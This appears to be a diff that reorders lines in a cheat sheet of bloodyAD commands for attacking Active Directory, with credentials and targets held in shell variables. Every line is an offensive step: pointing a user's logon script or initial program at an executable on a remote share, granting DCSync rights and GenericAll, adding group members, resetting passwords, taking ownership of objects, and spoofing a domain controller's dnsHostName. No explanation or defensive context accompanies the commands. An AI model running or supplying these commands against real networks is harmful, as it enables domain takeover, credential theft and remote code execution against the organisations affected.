@@ -1,9 +1,9 @@
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -k set object "$TARGET_OBJECT" groupType -v -2147483644
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -k set object "$TARGET_OBJECT" groupType -v -2147483640
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$COMPUTER_NAME" serviceprincipalname
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$COMPUTER_NAME" dnsHostName -v "$DC_NAME.$DOMAIN"
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object "$TARGET_COMPUTER" --attr dnsHostName,serviceprincipalname
-bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" msTSInitialProgram -v '\\1.2.3.4\share\file.exe'
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" msTSWorkDirectory -v 'C:\'
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET_USER" scriptPath -v '\\1.2.3.4\share\file.exe'
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner "$TARGET_OBJECT" "$TARGET_PRINCIPAL"
@@ -22,7 +22,7 @@ bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set owner "$TARGET
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add genericAll "$TARGET" "$USER"
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember "$TARGET_GROUP" "$TARGET_USER"
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set password "$TARGET_USER" "$NEW_PASSWORD"
-bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get writable --detail
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add dcsync "$USER"
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" msTSInitialProgram -v "\\\\$(fzf-ip)\\share\\file.exe"
 bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object "$TARGET" scriptPath -v "\\\\$(fzf-ip)\\share\\file.exe"
+bloodyAD -H "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get writable --detail
